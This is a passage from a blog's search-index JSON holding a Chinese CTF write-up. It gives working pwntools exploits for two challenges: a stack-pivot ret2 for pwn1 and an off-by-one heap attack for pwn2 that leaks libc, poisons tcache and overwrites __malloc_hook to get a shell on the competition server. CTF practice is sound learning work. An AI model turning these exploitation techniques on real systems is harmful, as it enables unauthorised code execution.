escape","namespace机制"]},{"title":"长安“战疫”网络安全卫士守护赛wp","url":"/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/","content":"总的来说比赛挺简单的，因为pwn2没遇到过所以调试花费的时间比较多，没来的及做pwn3，不过pwn3看了好像是存在任意地址写漏洞，猜测是修改exit的got表之类的，后面复现了再发(当然有可能因为太懒不发了)。\npwn1add esp, 10hmov eax, 0mov ecx, [ebp+var_4]leavelea esp,[ecx-4]retn\n\n注意程序不是从原本的位置开始ret就好了\nfrom pwn import *elf = ELF(&#x27;./pwn1&#x27;)# r = process(&#x27;./pwn1&#x27;)r = remote(&#x27;113.201.14.253&#x27;, 16088)shell_addr = 0x8048540r.recvuntil(b&#x27;Gift:&#x27;)buf_addr = int(r.recvuntil(b&#x27;\\n&#x27;, drop=True)[2:], 16)payload = b&#x27;a&#x27;*(0x38-0x4)+p32(buf_addr+0x38+8)+p32(0)+p32(shell_addr)# r.sendline(b&#x27;a&#x27;*(0x38+0x4))r.sendline(payload)r.interactive()\n\npwn2off by one程序在create的时候存在off by one漏洞，具体思路，覆盖下方chunk，释放chunk进入unsortedbin泄漏main_arena，释放chunk进入tcache修改到malloc上面的地址\nfrom pwn import *elf = ELF(&#x27;./pwn2&#x27;)libc = ELF(&#x27;./libc-2.27.so&#x27;)# r = process(&#x27;./pwn2&#x27;)r = remote(&#x27;113.201.14.253&#x27;, 16066)context.log_level = &#x27;debug&#x27;one_gadget = 0x10a41cdef create(size, content):    r.recvuntil(b&#x27;Choice: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content: &#x27;)    r.sendline(content)def edit(id, content):    r.recvuntil(b&#x27;Choice: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;idx: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content: &#x27;)    r.sendline(content)def delete(id):    r.recvuntil(b&#x27;Choice: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;idx: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def show(id):    r.recvuntil(b&#x27;Choice: &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;idx: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))# gdb.attach(r)create(0x68, b&#x27;a&#x27;*0x68)    # 0create(0x100, b&#x27;a&#x27;*0x100)  # 1create(0x68, b&#x27;a&#x27;*0x68)    # 2create(0x88, b&#x27;a&#x27;*0x88)    # 3create(0xf8, b&#x27;a&#x27;*0xf8)    # 4create(0x88, b&#x27;a&#x27;*0x88)    # 5# delete(9)delete(0)create(0x68, b&#x27;a&#x27;*(0x68-0x8)+p64(0)+b&#x27;\\x80&#x27;)  # 0# 让chunk1覆盖掉chunk2delete(1)create(0x170, b&#x27;a&#x27;)  # 1delete(3)create(0x88, b&#x27;a&#x27;*(0x88-0x8)+p64(0)+b&#x27;\\x90&#x27;)  # 3delete(4)# chunk4覆盖掉chunk5create(0x180, b&#x27;a&#x27;)  # 4for i in range(7):    create(0x88, b&#x27;a&#x27;)for i in range(7):    delete(12-i)delete(5)# 让chunk5进入unsortedbin获得main_arena地址edit(4, b&#x27;a&#x27;*(0xf8+0x8-1))show(4)r.recvuntil(b&#x27;aaaaaaaaaaaaaa\\n&#x27;)main_arena_88 = u64(r.recvuntil(b&#x27;1.Add&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_88))malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)print(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = libc_base+one_gadgetdelete(2)edit(1, b&#x27;a&#x27;*(0x100)+p64(0)+p64(0x70)+p64(malloc_hook-0x10))  # 2# 释放chunk2，进入tcache，修改fd指针create(0x68, b&#x27;a&#x27;)# gdb.attach(r)create(0x68, b&#x27;a&#x27;*0x10+p64(one_gadget))# 修改malloc_hookr.recvuntil(b&#x27;Choice: &#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;size: &#x27;)r.sendline(b&#x27;1&#x27;)# getshellr.interactive()\n\n自己还是在常见的漏洞上面出现问题比如这次的off by one还有off by null都还没去了解，所以下来会去了解这方面的漏洞原理和利用方式。\n","categories":["比赛wp"],"tags":["pwn"]}]